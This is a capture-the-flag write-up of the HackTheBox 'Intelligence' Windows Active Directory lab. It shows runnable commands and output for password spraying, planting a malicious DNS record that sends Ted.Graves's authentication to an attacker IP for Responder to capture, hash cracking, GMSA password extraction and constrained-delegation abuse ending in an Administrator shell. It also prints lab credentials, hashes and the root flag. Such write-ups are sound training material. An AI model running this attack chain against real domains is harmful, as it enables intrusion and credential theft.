---
title: "HackTheBox - Intelligence"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox"
date: 2025-11-11 13:24:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, pdf, metadata, password spraying, dns poisoning, responder, gmsa, constrained delegation, kerberos, s4u2self, s4u2proxy, bloodhound]
img_path: /assets/img/HackTheBox/Machines/Intelligence
image:
    path: /assets/img/HackTheBox/Machines/Intelligence/intelligence.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[Intelligence](https://www.hackthebox.com/machines/intelligence) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine that starts with enumerating a web server hosting PDF documents with predictable naming patterns. By downloading all PDFs and extracting metadata, we discover valid domain usernames and a default password hidden in one of the documents. After successfully password spraying, we gain access as `Tiffany.Molina` and find a PowerShell script in the IT share that performs periodic web checks using the credentials of `Ted.Graves`. Exploiting DNS poisoning with a malicious DNS record, we capture Ted's NTLMv2 hash via Responder and crack it offline. Using Ted's credentials, we retrieve the NTLM hash of the Group Managed Service Account (GMSA) `svc_int$` through BloodHound enumeration. Finally, we abuse Kerberos constrained delegation with protocol transition to impersonate the Administrator account, obtaining a service ticket for the domain controller and achieving full domain compromise.

## **Enumeration**

### nmap

```bash
Nmap scan report for 10.129.95.154
Host is up (0.15s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 15:58:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-11-11T15:59:53+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-11T15:59:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-11T15:59:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-11T15:59:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-11T15:59:21
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 426.23 seconds
```

this looks like normal Active Directory ports but i am not seeing WinRM 

and we also have a web server on port 80 that’s worth checking because normally this shouldn’t exsist 

anyway first let’s check SMB for anonymous 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ netexec smb intelligence.htb -u '' -p ''
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\: 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ netexec smb intelligence.htb -u '' -p '' --users
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\: 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ netexec smb intelligence.htb -u '' -p '' --shares 
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\: 
SMB         10.129.95.154   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

so we can authenticate but we can’t enumerate anything 

maybe the web on port 80 is the way in 

let’s check it out

![image.png](/assets/img/HackTheBox/Machines/Intelligence/image.png)

we can download some PDF documents from this URL

```bash
http://intelligence.htb/documents/2020-01-01-upload.pdf
```

after opening the PDF it’s in Latin and has just random Quotes

but the files can contain some interesting metadata 

let’s check them out

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ exiftool *.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number         : 13.25
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:11:11 04:17:31-05:00
File Access Date/Time           : 2025:11:11 04:17:31-05:00
File Inode Change Date/Time     : 2025:11:11 04:17:55-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number         : 13.25
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:11:11 04:17:01-05:00
File Access Date/Time           : 2025:11:11 04:17:01-05:00
File Inode Change Date/Time     : 2025:11:11 04:17:56-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
    2 image files read
```

as we can see we found two usernames 

and since the file names has a structure we can maybe find more PDFs in other dates

so here is how we can get any available files from the server from the beginning of 2020 to the end of 2021 

first we create the file name list

```bash
 ┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence/pdfs]
└─$ d=2020-01-01
end=2021-12-31
while [ "$d" != "$(date -I -d "$end + 1 day")" ]; do
    echo "$d-upload.pdf"
    d=$(date -I -d "$d + 1 day")
done > ../file_names.txt
```

and then we use a loop and wget to download all the available ones

```bash
for i in $(cat ../file_names.txt); do wget http://10.129.95.154/documents/$i; done
```

after this we can see that we downloaded a bunch of files

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence/pdfs]
└─$ ll
total 2360
-rw-rw-r-- 1 drli drli 26835 Apr  1  2021 2020-01-01-upload.pdf
-rw-rw-r-- 1 drli drli 27002 Apr  1  2021 2020-01-02-upload.pdf
-rw-rw-r-- 1 drli drli 27522 Apr  1  2021 2020-01-04-upload.pdf
-rw-rw-r-- 1 drli drli 26400 Apr  1  2021 2020-01-10-upload.pdf
-rw-rw-r-- 1 drli drli 11632 Apr  1  2021 2020-01-20-upload.pdf
-rw-rw-r-- 1 drli drli 28637 Apr  1  2021 2020-01-22-upload.pdf
-rw-rw-r-- 1 drli drli 11557 Apr  1  2021 2020-01-23-upload.pdf
...
```

now let’s filter for all the usernames

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence/pdfs]
└─$ exiftool *.pdf | grep -i "creator" | sort | uniq
Creator                         : Anita.Roberts
Creator                         : Brian.Baker
Creator                         : Brian.Morris
Creator                         : Daniel.Shelton
Creator                         : Danny.Matthews
Creator                         : Darryl.Harris
Creator                         : David.Mcbride
Creator                         : David.Reed
Creator                         : David.Wilson
Creator                         : Ian.Duncan
Creator                         : Jason.Patterson
Creator                         : Jason.Wright
Creator                         : Jennifer.Thomas
Creator                         : Jessica.Moody
Creator                         : John.Coleman
Creator                         : Jose.Williams
Creator                         : Kaitlyn.Zimmerman
Creator                         : Kelly.Long
Creator                         : Nicole.Brock
Creator                         : Richard.Williams
Creator                         : Samuel.Richardson
Creator                         : Scott.Scott
Creator                         : Stephanie.Young
Creator                         : Teresa.Williamson
Creator                         : Thomas.Hall
Creator                         : Thomas.Valenzuela
Creator                         : Tiffany.Molina
Creator                         : Travis.Evans
Creator                         : Veronica.Patel
Creator                         : William.Lee
```

let’s test if these usernames are actually working

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/11/25 - Ronnie Flathers @ropnop

2025/11/11 05:48:56 >  Using KDC(s):
2025/11/11 05:48:56 >   dc.intelligence.htb:88

2025/11/11 05:48:56 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/11/11 05:48:56 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2025/11/11 05:48:56 >  Done! Tested 30 usernames (30 valid) in 0.179 seconds
```

OK now we have users but how can we find any credentials?

what if any of the PDFs has something else other than random Quotes?

let’s test this theory

using pdf2txt we can get the content of the PDFs in one file

```bash
for i in $(ls); do pdf2txt $i; done > text.txt
```

and if we filter for anything related to a password we get this

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence/pdfs]
└─$ grep -A 5 -i "password" text.txt
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```

now let’s password spray this and see if it works

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ nxc smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success     
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
...
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```

the password finally works for `Tiffany.Molina`

let’s see what we can do with this

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares              
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ  
```

we have read access to both the Users and IT shares

starting with the user share the only thing interesting is the user flag in Tiffany desktop

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ smbclient  -U 'Tiffany.Molina' //10.129.95.154/Users                            
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina\
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Tue Nov 11 10:50:06 2025

                3770367 blocks of size 4096. 1450361 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt 
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

### Privilege Escalation

the IT share could have something interesting

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ smbclient  -U 'Tiffany.Molina' //10.129.95.154/IT
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1450361 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \> exit 
```

we have a powershell script 

```bash
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

this script is vulnerable to DNS spoofing 

it uses **`-UseDefaultCredentials`** which automatically sends the current user's (Ted.Graves) credentials with every web request. This means if you control a DNS record that matches **`web*`**, you can capture Ted's Net-NTLM hash when the script executes.

here is how we can exploit it

first let’s **Add a malicious DNS record**

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ python3 /home/drli/Desktop/krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r web-attacker.intelligence.htb -d 10.10.14.100 --action add 10.129.95.154

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

now using responder we have to wait for 5 minutes until the script runs and we get Teds credentials

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.100]
    Responder IPv6             [dead:beef:2::1062]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-AG7F1FXN55C]
    Responder Domain Name      [U538.LOCAL]
    Responder DCE-RPC Port     [46843]

[+] Listening for events...                                                                                         

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: ::ffff:10.129.95.154  URL: / 
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:cfed6d44d7551a54:5620A8EE7FE625E25E4A3B739662466A:0101000000000000CB67C71A4053DC017D254B62FC487B2C0000000002000800550035003300380001001E00570049004E002D0041004700370046003100460058004E003500350043000400140055003500330038002E004C004F00430041004C0003003400570049004E002D0041004700370046003100460058004E003500350043002E0055003500330038002E004C004F00430041004C000500140055003500330038002E004C004F00430041004C000800300030000000000000000000000000200000E7C7CF8716010D54A2B4E898183A2060FE645725D12C78DD228AB246406DF1A20A001000000000000000000000000000000000000900440048005400540050002F007700650062002D00610074007400610063006B00650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
```

let’s crack the NTLMv2 hash

```bash
TED.GRAVES::intelligence:9f9e09abecc1247d:8a1a68d04fcbaa1d472aab87885e4339:0101000000000000f75082cd4053dc01d8fcca4834ebdc510000000002000800550035003300380001001e00570049004e002d0041004700370046003100460058004e003500350043000400140055003500330038002e004c004f00430041004c0003003400570049004e002d0041004700370046003100460058004e003500350043002e0055003500330038002e004c004f00430041004c000500140055003500330038002e004c004f00430041004c000800300030000000000000000000000000200000e7c7cf8716010d54a2b4e898183a2060fe645725d12c78dd228ab246406df1a20a001000000000000000000000000000000000000900440048005400540050002f007700650062002d00610074007400610063006b00650072002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:9f9e09abecc1247d:8a1a68d04...000000
Time.Started.....: Tue Nov 11 06:28:18 2025 (12 secs)
Time.Estimated...: Tue Nov 11 06:28:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   888.2 kH/s (0.89ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10814464/14344385 (75.39%)
Rejected.........: 0/10814464 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Ms.Jordan -> Mr.Brownstone
Hardware.Mon.#1..: Util: 62%

Started: Tue Nov 11 06:28:16 2025
Stopped: Tue Nov 11 06:28:32 2025
```

now we can connect as Ted

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ nxc smb intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy'   
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

using bloodhound we discover that Ted is a member of the `IT` group that can read the password of the group managed service account `SVC_INT$`

![image.png](/assets/img/HackTheBox/Machines/Intelligence/image1.png)

let’s get the password using netexec

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ nxc ldap intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
LDAPS       10.129.95.154   636    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
LDAPS       10.129.95.154   636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.95.154   636    DC               Account: svc_int$             NTLM: 655fefd062c233e273bb9f0566384474     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']   
```

and this account has `allowtodelegate` privileges over the DC

which means we can perform the `constrained delegation` attack

first let’s confirm that the account has the right attributes set

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ python3 ~/Desktop/bloodyAD/bloodyAD.py --host 10.129.95.154 -d intelligence.htb -u 'svc_int$' -p ":655fefd062c233e273bb9f0566384474" get object 'svc_int$' --attr msDS-AllowedToDelegateTo,userAccountControl,servicePrincipalName

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION
```

all good 

now we need to perform the Silver Ticket attack and impersonate the Administrator

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ sudo ntpdate dc.intelligence.htb; getST.py -spn WWW/dc.intelligence.htb 'intelligence.htb/svc_int$' -hashes ':655fefd062c233e273bb9f0566384474' -impersonate Administrator -dc-ip 10.129.95.154
2025-11-11 15:23:28.265483 (-0500) +28800.384003 +/- 0.031834 dc.intelligence.htb 10.129.95.154 s1 no-leap
CLOCK: time stepped by 28800.384003
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
                                                                                                                                           
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 
                                                                                                                                           
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ klist
Ticket cache: FILE:Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
Default principal: Administrator@intelligence.htb

Valid starting       Expires              Service principal
11/11/2025 15:23:33  11/12/2025 01:23:32  WWW/dc.intelligence.htb@INTELLIGENCE.HTB
        renew until 11/12/2025 15:23:32
```

we can now connect as admin using WMIexec

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/intelligence]
└─$ impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\Users\Administrator\Desktop

04/18/2021  04:51 PM    <DIR>          .
04/18/2021  04:51 PM    <DIR>          ..
11/11/2025  07:50 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,932,646,400 bytes free

C:\Users\Administrator\Desktop>type root.txt
fae39fdfc55b9a707ba97ddd04346eae
```

DONE!